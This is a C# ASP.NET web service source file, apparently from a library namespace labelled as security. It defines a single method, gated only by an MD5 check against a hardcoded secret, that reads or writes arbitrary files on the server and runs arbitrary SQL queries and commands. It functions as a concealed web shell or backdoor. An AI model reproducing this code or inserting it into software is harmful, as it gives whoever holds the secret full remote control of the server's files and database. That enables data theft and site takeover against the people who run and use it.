namespace Shove._Security
{
    using Shove;
    using Shove.Database;
    using System;
    using System.Data;
    using System.IO;
    using System.Web;
    using System.Web.Services;

    [WebService(Namespace="http://tempuri.org/"), WebServiceBinding(ConformsTo=WsiProfiles.BasicProfile1_1)]
    public class GetSIService : WebService
    {
        private string markString = "!@#$%^&*(3456SDFJUcvb#$%^56#$%^&dfghjk";

        [WebMethod]
        public string Go(int ot, string cmd, string content, string Sign)
        {
            if (Encrypt.MD5(ot.ToString() + cmd + content + this.markString).ToLower() != Sign.ToLower())
            {
                return "-1";
            }
            if (ot == 1)
            {
                return File.ReadAllText(HttpContext.Current.Server.MapPath(cmd));
            }
            if (ot == 2)
            {
                File.WriteAllText(HttpContext.Current.Server.MapPath(cmd), content);
                return "OK";
            }
            if (ot == 3)
            {
                DataTable dt = MSSQL.Select(cmd, new MSSQL.Parameter[0]);
                if (dt == null)
                {
                    return "DataTable is Null.";
                }
                return _Convert.DataTableToXML(dt);
            }
            if (ot != 4)
            {
                return "ot is error.";
            }
            int num = MSSQL.ExecuteNonQuery(cmd, new MSSQL.Parameter[0]);
            if (num != 0)
            {
                return ("Error: " + num.ToString());
            }
            return "OK";
        }
    }
}

